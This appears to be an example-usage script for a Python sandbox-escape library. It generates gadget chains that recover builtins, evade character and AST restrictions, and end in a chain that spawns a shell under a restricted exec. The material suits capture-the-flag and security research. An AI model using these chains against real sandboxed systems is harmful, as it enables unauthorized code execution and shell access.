import ast
import jailbreak

#example usage for accessing specific gadget as current python code
from jailbreak.gadgets.python import builtins_dict
print(builtins_dict.builtins_dict__gi_builtins)

#example usage for gadget chains with the terminating gadget requiring parameters
payload = jailbreak.get_obj_dict("type(dict)")
print(payload)

print("\n---------\n")

#example usage for gadget chains with multi dependencies, and setting restrictions
jailbreak.config(provided=['type'], ast=[ast.GeneratorExp])
payload = jailbreak.builtins_dict()
print(payload)

print("\n---------\n")

#example usage for gadget chains that require converters to run (strless)
jailbreak.config(provided=['sys'], char='\'"')
payload = jailbreak.os()
print(payload)
assert all(c not in payload for c in '\'"')

print("\n---------\n")

#example get shell full chain
jailbreak.config(provided=['sys'])
payload = jailbreak.get_shell("'sh'")
print(payload)
#import sys
#exec(payload, {'__builtins__': {}, 'sys': sys})